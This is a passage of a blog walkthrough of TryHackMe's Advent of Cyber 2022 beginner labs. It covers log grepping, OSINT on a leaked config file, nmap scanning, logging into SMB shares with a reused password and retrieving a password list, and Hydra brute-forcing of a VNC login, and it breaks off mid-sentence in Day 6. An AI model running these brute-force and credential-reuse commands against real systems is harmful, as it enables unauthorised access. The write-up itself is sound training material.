<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Try Hack Me - Advent of Cyber 4 (2022)" /><meta property="og:locale" content="en" /><meta name="description" content="After waiting for a full year, it’s finally back! Try Hack Me is hosting their famous Advent of Cyber for the 4th time. It consists of a series of beginner challenges, which you can complete every day from the first of December until Christmas. I thought it would be cool to give it a go, so I’ll try to update everyday (or as soon as I can) for the different challenges I complete." /><meta property="og:description" content="After waiting for a full year, it’s finally back! Try Hack Me is hosting their famous Advent of Cyber for the 4th time. It consists of a series of beginner challenges, which you can complete every day from the first of December until Christmas. I thought it would be cool to give it a go, so I’ll try to update everyday (or as soon as I can) for the different challenges I complete." /><link rel="canonical" href="https://ak01sito.github.io/posts/advent-of-cyber-2022/" /><meta property="og:url" content="https://ak01sito.github.io/posts/advent-of-cyber-2022/" /><meta property="og:site_name" content="ak01sito" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-12-01T06:28:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Try Hack Me - Advent of Cyber 4 (2022)" /><meta name="twitter:site" content="@ak01sito" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-28T22:21:15+01:00","datePublished":"2022-12-01T06:28:00+01:00","description":"After waiting for a full year, it’s finally back! Try Hack Me is hosting their famous Advent of Cyber for the 4th time. It consists of a series of beginner challenges, which you can complete every day from the first of December until Christmas. I thought it would be cool to give it a go, so I’ll try to update everyday (or as soon as I can) for the different challenges I complete.","headline":"Try Hack Me - Advent of Cyber 4 (2022)","mainEntityOfPage":{"@type":"WebPage","@id":"https://ak01sito.github.io/posts/advent-of-cyber-2022/"},"url":"https://ak01sito.github.io/posts/advent-of-cyber-2022/"}</script><title>Try Hack Me - Advent of Cyber 4 (2022) | ak01sito</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ak01sito"><meta name="application-name" content="ak01sito"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/37373077?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ak01sito</a></div><div class="site-subtitle font-italic">Security Analyst / Wannabe Pentester</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ak01sito" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ak01sito" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Try Hack Me - Advent of Cyber 4 (2022)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Try Hack Me - Advent of Cyber 4 (2022)</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1669872480" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Dec 1, 2022 </em> </span> <span> Updated <em class="" data-ts="1674940875" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 28, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/username">Mireia</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="7811 words"> <em>43 min</em> read</span></div></div></div><div class="post-content"><p>After waiting for a full year, it’s finally back! <a href="https://tryhackme.com">Try Hack Me</a> is hosting their famous <a href="https://tryhackme.com/room/adventofcyber4">Advent of Cyber</a> for the 4th time. It consists of a series of beginner challenges, which you can complete every day from the first of December until Christmas. I thought it would be cool to give it a go, so I’ll try to update everyday (or as soon as I can) for the different challenges I complete.</p><p>They have a cool story following the whole duration of the challenges, which explains that we need to solve the challenges in order to save Christmas. I will not follow the story so much, so hope you just enjoy the challenges.</p><p><strong>Table of Contents</strong></p><ul><li><a href="#day-1---someones-coming-to-town-frameworks">Day 1 - Someone’s coming to town! (Frameworks)</a><li><a href="#day-2---santas-naughty-and-nice-log-log-analysis">Day 2 - Santa’s Naughty and Nice Log (Log Analysis)</a><li><a href="#day-3---nothing-escapes-detective-mcred--osint">Day 3 - Nothing escapes detective McRed (OSINT)</a><li><a href="#day-4---scanning-through-the-snow-scanning">Day 4 - Scanning through the snow (Scanning)</a><li><a href="#day-5---he-knows-when-youre-awake-brute-forcing">Day 5 - He knows when you’re awake (Brute-Forcing)</a><li><a href="#day-6---its-beginning-to-look-a-lot-like-phishing-email-analysis">Day 6 - It’s beginning to look a lot like phishing (Email Analysis)</a><li><a href="#day-7---maldocs-roasting-on-an-open-fire-cyberchef">Day 7 - Maldocs roasting on an open fire (CyberChef)</a><li><a href="#day-8---last-christmas-i-gave-you-my-eth-smart-contracts-draft">Day 8 - Last Christmas I gave you my ETH (Smart Contracts) (DRAFT)</a><li><a href="#day-9---dock-the-halls-pivoting">Day 9 - Dock the halls (Pivoting)</a><ul><li><a href="#compromising-a-machine-through-metasploit">Compromising a machine through metasploit</a><li><a href="#pivoting-to-the-db">Pivoting to the DB</a><li><a href="#pivoting-to-the-root-machine">Pivoting to the root machine</a></ul><li><a href="#day-10---youre-a-mean-one-mryeti-hack-a-game">Day 10 - You’re a mean one, Mr.Yeti (Hack a game)</a><li><a href="#day-14---im-dreaming-of-secure-web-apps-web-application">Day 14 - I’m dreaming of secure web apps (Web Application)</a><li><a href="#day-22---threats-are-failing-all-around-me-attack-surface-reduction">Day 22 - Threats are failing all around me (Attack Surface Reduction)</a><li><a href="#day-23---mission-elfpossible-abominable-for-a-day--defence-in-depth">Day 23 - Mission ELFPossible: Abominable for a Day (Defence in Depth)</a><li><a href="#next-days-incoming-">Next days incoming …</a></ul><h1 id="day-1---someones-coming-to-town-frameworks">Day 1 - Someone’s coming to town! (Frameworks)</h1><p>TOday we will be simply relating words with their definition. When we press on the <em>View Site</em> green button, we can see a website in which we have to solve 3 puzzles. Those are not too difficult, but they teach us about the different phases of the <strong>Unified Kill Chain</strong>. For each puzzle we have some deffinitions, and we need to see which piece goes where depending on that. The puzzles’ clues and solutions look as follow:</p><p><strong>Puzzle 1</strong></p><ol><li>Research is part of my task, finding clues in public sources. <strong>Reconnaissance</strong><li>Simple documents I turn into malware. <strong>Weaponisation</strong><li>A pizza, parcel or payload all have me as an action in common. <strong>Delivery</strong><li>A con is the name of my game, tricking you into believing a false identity. <strong>Social Engineering</strong><li>Weaknesses are my go-to resources; through them, I make my presence felt. <strong>Exploitation</strong><li>I am set up to let you back into the network after you leave. <strong>Persistence</strong><li>Deletion of evidence is part of my process. <strong>Defence Evasion</strong><li>Communication with the compromised goes through me. <strong>Command &amp; Control</strong></ol><p><img data-src="/images/adventofcyber_puzzle1.png" alt="puzzle 1" data-proofer-ignore></p><p><strong>Puzzle 2</strong></p><ol><li>I am an anchor that lets you go on an adventure and explore. <strong>Pivoting</strong><li>With me, you can locate new information to expand the attack. <strong>Discovery</strong><li>Once a pawn, I became a King. <strong>Privilege Escalation</strong><li>My payloads are triggered to infect all they come in contact with. <strong>Execution</strong><li>Passwords I collect are the keys to the mainframe. <strong>Credential Access</strong><li>Side to side, machine to machine, we hop. <strong>Lateral Movement</strong></ol><p><img data-src="/images/adventofcyber_puzzle2.png" alt="puzzle 2" data-proofer-ignore></p><p><strong>Puzzle 3</strong></p><ol><li>In your vault, I am in. <strong>Access</strong><li>Like a dragon, I gather all valuable loot. <strong>Collection</strong><li>I export gathered treasures. <strong>Exfiltration</strong><li>With me, your reputation goes tumbling down. <strong>Impact</strong><li>Goals set, goals attained. I win! <strong>Objectives</strong></ol><p><img data-src="/images/adventofcyber_puzzle3.png" alt="puzzle 3" data-proofer-ignore></p><p>After completing the 3 puzzles, we see a final page in which we get the info to answer the two questions of the challenge:</p><p><strong>Who is the adversary that attacked Santa’s network this year?</strong> <code class="language-plaintext highlighter-rouge">The Bandit Yeti</code></p><p><strong>What’s the flag that they left behind?</strong> <code class="language-plaintext highlighter-rouge">THM{IT'S A Y3T1 CHR1$TMA$}</code></p><h1 id="day-2---santas-naughty-and-nice-log-log-analysis">Day 2 - Santa’s Naughty and Nice Log (Log Analysis)</h1><p>For today’s challenge we are going to be taking a look at log files. For that, we start the machine and connect to it via <code class="language-plaintext highlighter-rouge">ssh</code>:</p><p><code class="language-plaintext highlighter-rouge">ssh elfmcblue@IP_ADDRESS</code></p><p>Introduce the password when prompted, and we can start answering the questions:</p><p><strong>Use the ls command to list the files present in the current directory. How many log files are present?</strong></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>elfmcblue@day-2-log-analysis:~$ ls
SSHD.log  webserver.log
</pre></table></code></div></div><p>So the answer is <code class="language-plaintext highlighter-rouge">2</code> (<code class="language-plaintext highlighter-rouge">SSHD.log</code> and <code class="language-plaintext highlighter-rouge">webserver.log</code>).</p><p><strong>Elf McSkidy managed to capture the logs generated by the web server. What is the name of this log file?</strong> Looks like it’s the one called <code class="language-plaintext highlighter-rouge">webserver.log</code> (what a surprise).</p><p><strong>On what day was Santa’s naughty and nice list stolen?</strong> We don’t know how the list is called exactly, but let’s assume it has either the word “naughty” or “nice”.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>elfmcblue@day-2-log-analysis:~$ grep naughty webserver.log 
10.10.249.191 - - [18/Nov/2022:12:35:18 +0000] "GET /naughty-james HTTP/1.1" 404 437 "-" "gobuster/3.0.1"
</pre></table></code></div></div><p>BINGO!</p><p>So the date is 18th of November of 2022. I tried a few ways of writing this down on the platform and nothing was working. Finally I looked for which day of the week 18th of November of 2022 was, and then the platform accepted it!</p><p>So the answer is <code class="language-plaintext highlighter-rouge">friday</code>.</p><p><strong>What is the IP address of the attacker?</strong> In the same line of the log retrieved for the previous question, we can see that the IP address used was <code class="language-plaintext highlighter-rouge">10.10.249.191</code>, so that’s the answer.</p><p><strong>What is the name of the important list that the attacker stole from Santa?</strong> Since we know that the list has the structure <code class="language-plaintext highlighter-rouge">**********.***</code> (so, 10 characters, a dot, and 3 more characters), we can try to use the <code class="language-plaintext highlighter-rouge">grep -E</code> flag to use regex. The expression used is <code class="language-plaintext highlighter-rouge">[A-Za-z0-9]{10}\.[A-Za-z0-9]{3}</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>elfmcblue@day-2-log-analysis:~$ grep -E "[A-Za-z0-9]{10}\.[A-Za-z0-9]{3}" webserver.log 
10.9.12.30 - - [18/Nov/2022:12:18:23 +0000] "GET /assets/css/stylesheet.e534de95c45f12e712642d4891fdc622837d0270dd58b129282e0e4b65b5df1a.css HTTP/1.1" 200 4526 "http://10.10.60.160/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
10.10.249.191 - - [18/Nov/2022:12:34:39 +0000] "GET /santaslist.txt HTTP/1.1" 200 133872 "-" "Wget/1.19.4 (linux-gnu)"
</pre></table></code></div></div><p>Not sure if my regex is nice and elegant, since I’m not good at it, but it worked, so we find that the list is <code class="language-plaintext highlighter-rouge">santaslist.txt</code></p><p><strong>Look through the log files for the flag. The format of the flag is: THM{}</strong> Since we know part of the structure of the flag, it will be easy to get it with another grep. First we try the <code class="language-plaintext highlighter-rouge">webserver.log</code> file:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>elfmcblue@day-2-log-analysis:~$ grep THM webserver.log 
10.10.249.191 - - [18/Nov/2022:12:35:20 +0000] "GET /AU7VTHM1YVYV8 HTTP/1.1" 404 437 "-" "gobuster/3.0.1"
</pre></table></code></div></div><p>mmmm so there is a line which contains “THM”, but that’s not the flag. Let’s try it on the other log file (<code class="language-plaintext highlighter-rouge">SSHD.log</code>)</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>elfmcblue@day-2-log-analysis:~$ grep "THM" SSHD.log
THM{STOLENSANTASLIST}
</pre></table></code></div></div><p>There it is! Second day solved</p><h1 id="day-3---nothing-escapes-detective-mcred--osint">Day 3 - Nothing escapes detective McRed (OSINT)</h1><p>Today’s challenge is focused on OSINT, which is the data and information that is collected from publicly available sources. As always, we get a bit of information on the topic, which is really nicely explained and contains everything we need to solve the questions. So let’s get to it:</p><p><strong>What is the name of the Registrar for the domain santagift.shop?</strong> Let’s look for the domain’s information in the <a href="https://who.is/whois">who.is</a> website. We enter the domain <code class="language-plaintext highlighter-rouge">santagift.shop</code>, and the first thing on the information table we see is the <em>Registrar Info</em>, where we can see that the name is <code class="language-plaintext highlighter-rouge">NAMECHEAP INC</code>.</p><p><strong>Find the website’s source code (repository) on github.com and open the file containing sensitive credentials. Can you find the flag?</strong> If we go to <a href="https://github.com">GitHub</a>, and search for <code class="language-plaintext highlighter-rouge">Santagiftshop</code> or <code class="language-plaintext highlighter-rouge">santagift.shop</code>, we will see the repository from muhammadthm:</p><p><img data-src="/images/adventofcyber_day3_1.png" alt="github repo" data-proofer-ignore></p><p>Looking around a bit, we see that the flag is at the beginning of the file <code class="language-plaintext highlighter-rouge">config.php</code>. So the answer is <code class="language-plaintext highlighter-rouge">THM_OSINT_WORKS</code>.</p><p><strong>What is the name of the file containing passwords?</strong> As said in the previous question, the file is <code class="language-plaintext highlighter-rouge">config.php</code>.</p><p><strong>What is the name of the QA server associated with the website?</strong> On the main page of the repository on GitHub, we can see that the <code class="language-plaintext highlighter-rouge">README</code> is already giving us the answer:</p><p><img data-src="/images/adventofcyber_day3_2.png" alt="github QA domain" data-proofer-ignore></p><p>So the answer is <code class="language-plaintext highlighter-rouge">qa.santagift.shop</code>.</p><p><strong>What is the DB_PASSWORD that is being reused between the QA and PROD environments?</strong> On the same <code class="language-plaintext highlighter-rouge">config.php</code> file we saw before, if we look for <code class="language-plaintext highlighter-rouge">DB_PASSWORD</code>, we see that the two occurrences have the same value (<code class="language-plaintext highlighter-rouge">S@nta2022</code>), and they are used <code class="language-plaintext highlighter-rouge">if($ENV = "QA")</code>, and <code class="language-plaintext highlighter-rouge">if($ENV = "PROD")</code>. Which means that the QA and PROD environments share the same value of <code class="language-plaintext highlighter-rouge">DB_PASSWORD</code>. The answer is then <code class="language-plaintext highlighter-rouge">S@nta2022</code>.</p><p>See you tomorrow!</p><h1 id="day-4---scanning-through-the-snow-scanning">Day 4 - Scanning through the snow (Scanning)</h1><p>Today we will be scanning a host for open ports, and use the information from yesterday’s challenge in order to see how the <code class="language-plaintext highlighter-rouge">santagift.shop</code> website was compromised.</p><p>First of all, let’s see which ports are open and what are the services running on those.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>└─$ nmap -sV &lt;IP_ADDRESS&gt;     
Starting Nmap 7.91 ( https://nmap.org ) at 2022-12-04 17:52 CET
Nmap scan report for &lt;IP_ADDRESS&gt;
Host is up (0.041s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: IP-&lt;IP_ADDRESS&gt;; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
</pre></table></code></div></div><p>With that, we can already answer the firsts questions:</p><p><strong>What is the name of the HTTP server running on the remote host?</strong> : <code class="language-plaintext highlighter-rouge">Apache</code>.</p><p><strong>What is the name of the service running on port 22 on the QA server?</strong> <code class="language-plaintext highlighter-rouge">ssh</code>.</p><p>For the last two questions we will need to connect to the Samba service. Since I haven’t used it much, I thought I would do it through <code class="language-plaintext highlighter-rouge">cli</code> (opposite to the way they show on the platform), and learn a bit for future challenges. We are given:</p><ul><li>Username : <code class="language-plaintext highlighter-rouge">ubuntu</code><li>password : <code class="language-plaintext highlighter-rouge">S@nta2022</code><li>ip address : may vary. I’ll show it as <code class="language-plaintext highlighter-rouge">&lt;IP_ADDRESS&gt;</code></ul><p>First, to see which shares are available on this host, let’s run <code class="language-plaintext highlighter-rouge">smbclient -U ubuntu -L &lt;IP_ADDRESS&gt;</code>, and enter the password when prompted:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>└─$ smbclient -U ubuntu -L &lt;IP_ADDRESS&gt; 
Enter WORKGROUP\ubuntu's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        sambashare      Disk      Samba on Ubuntu
        admins          Disk      Samba on Ubuntu
        IPC$            IPC       IPC Service (ip-&lt;IP_ADDRESS&gt; server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
</pre></table></code></div></div><p>The share <code class="language-plaintext highlighter-rouge">admins</code> looks juicy, so let’s access this one. The service is called <code class="language-plaintext highlighter-rouge">//&lt;IP_ADDRESS&gt;/admins</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>└─$ smbclient -U ubuntu //&lt;IP_ADDRESS&gt;/admins S@nta2022
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Thu Nov 10 06:44:30 2022
  ..                                  D        0  Wed Nov  9 18:43:21 2022
  flag.txt                            A       23  Wed Nov  9 18:55:58 2022
  userlist.txt                        A      111  Thu Nov 10 06:44:29 2022
</pre></table></code></div></div><p>Looks like we got it! Now we will use <code class="language-plaintext highlighter-rouge">smbget</code> to download the files from the share.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>└─$ smbget smb://&lt;IP_ADDRESS&gt;/admins/flag.txt -U "ubuntu%S@nta2022"
Using workgroup WORKGROUP, user ubuntu
smb://&lt;IP_ADDRESS&gt;/admins/flag.txt                                                                                  
Downloaded 23b in 0 seconds

└─$ cat flag.txt                         
{THM_SANTA_SMB_SERVER}

└─$ smbget smb://&lt;IP_ADDRESS&gt;/admins/userlist.txt -U "ubuntu%S@nta2022"
Using workgroup WORKGROUP, user ubuntu
smb://&lt;IP_ADDRESS&gt;/admins/userlist.txt                                                                              
Downloaded 111b in 0 seconds

└─$ cat userlist.txt 
USERNAME        PASSWORD
santa           santa101
santahr         santa25
santaciso       santa30
santatech       santa200
santaaccounts   santa400
</pre></table></code></div></div><p><strong>What flag can you find after successfully accessing the Samba service?</strong> As we can see in the output of the <code class="language-plaintext highlighter-rouge">cat flag.txt</code> command, the flag is <code class="language-plaintext highlighter-rouge">{THM_SANTA_SMB_SERVER}</code>.</p><p><strong>What is the password for the username santahr?</strong> As we can see in the output of the <code class="language-plaintext highlighter-rouge">cat unserlist.txt</code> command, the password is <code class="language-plaintext highlighter-rouge">santa25</code>.</p><h1 id="day-5---he-knows-when-youre-awake-brute-forcing">Day 5 - He knows when you’re awake (Brute-Forcing)</h1><p>Welcome to Day 5 of Advent of Cyber. Today we’ll be discovering a password via brute-forcing, and using it to connect to the VNC server. Let’s see what they ask us to do:</p><p><strong>Use Hydra to find the VNC password of the target with IP address <code class="language-plaintext highlighter-rouge">&lt;IP_ADDRESS&gt;</code>. What is the password?</strong></p><p>We will the use the tool <em>Hydra</em> for that. The command we want to use has the following syntax:</p><p><code class="language-plaintext highlighter-rouge">hydra -l username -P wordlist.txt server service</code></p><ul><li>username : they didn’t give us a specific username, so let’s try it without one.<li>wordlist.txt : On kali linux there are already pre-made wordlists. We’ll be using <code class="language-plaintext highlighter-rouge">/usr/share/wordlists/rockyou.txt</code><li>server : that’s the IP address given when starting the machine. In my case it’s <code class="language-plaintext highlighter-rouge">10.10.170.133</code><li>service : which service we want to launch the attack to (<code class="language-plaintext highlighter-rouge">ssh</code>, <code class="language-plaintext highlighter-rouge">rdp</code>, <code class="language-plaintext highlighter-rouge">ftp</code>, <code class="language-plaintext highlighter-rouge">vnc</code>, etc). In this case they are asking us for <code class="language-plaintext highlighter-rouge">vnc</code></ul><p>So we run <code class="language-plaintext highlighter-rouge">hydra -P /usr/share/wordlists/rockyou.txt 10.10.170.130 vnc</code></p><p><img data-src="/images/adventofcyber_day5_hydra.png" alt="hydra" data-proofer-ignore></p><p>After a while, it finds a valid pair, which means that there was no user, and the password is <code class="language-plaintext highlighter-rouge">1q2w3e4r</code>.</p><p><strong>Using a VNC client on the AttackBox, connect to the target of IP address MACHINE_IP. What is the flag written on the target’s screen?</strong></p><p>To solve this, I decided to use <code class="language-plaintext highlighter-rouge">vncviewer</code>. The syntax is <code class="language-plaintext highlighter-rouge">vncviewer host::port</code>. We are missing the port, so we can just run the following nmap command:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>└─$ nmap -sV 10.10.170.133  
Starting Nmap 7.92 ( [https://nmap.org](https://nmap.org/) ) at 2022-12-05 12:36 EST  
Nmap scan report for 10.10.170.133  
Host is up (0.034s latency).  
Not shown: 998 closed tcp ports (conn-refused)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)  
5900/tcp open  vnc     VNC (protocol 3.8)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 1.57 seconds
</pre></table></code></div></div><p>We find then that the port is <code class="language-plaintext highlighter-rouge">5900</code>, and we can now connect to the target via vnc.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>└─$ vncviewer 10.10.170.133::5900  
Connected to RFB server, using protocol version 3.8  
Performing standard VNC authentication  
Password:  
Authentication successful  
</pre></table></code></div></div><p>And automatically, the remote target’s window pops up: <img data-src="/images/adventofcyber_day5_vnc.png" alt="puzzle 3" data-proofer-ignore> We can see on the background of the screen that the flag is <code class="language-plaintext highlighter-rouge">THM{I_SEE_YOUR_SCREEN}</code>.</p><h1 id="day-6---its-beginning-to-look-a-lot-like-phishing-email-analysis">Day 6 - It’s beginning to look a lot like phishing (Email Analysis)</h1><p>On today’s challenge we’ll be analyzing the headers and files on emails to determine if they are malicious, where did they actually come from, and so on.</p><p>After starting the machine, let’s open the “Split View” on the platform. We see a Desktop with a file called <code class="language-plaintext highlighter-rouge">Urgent:.eml</code>. That’s what we will be analyzing. We will run the following command to get all the information from the file: <code class="language-plaintext highlighter-rouge">emlAnalyzer -i Urgent\:.eml --header --html -u --text --extract-all</code></p><p><img data-src="/images/adventofcyber_day6_emlanalyzer.png" alt="emlanalyzer" data-proofer-ignore></p><p><strong>What is the email address of the sender?</strong> <code class="language-plaintext highlighter-rouge">chief.elf@santaclaus.thm</code></p><p><strong>What is the return address?</strong> <code class="language-plaintext highlighter-rouge">murphy.evident@bandityeti.thm</code></p><p><strong>On whose behalf was the email sent?</strong> <code class="language-plaintext highlighter-rouge">Chief 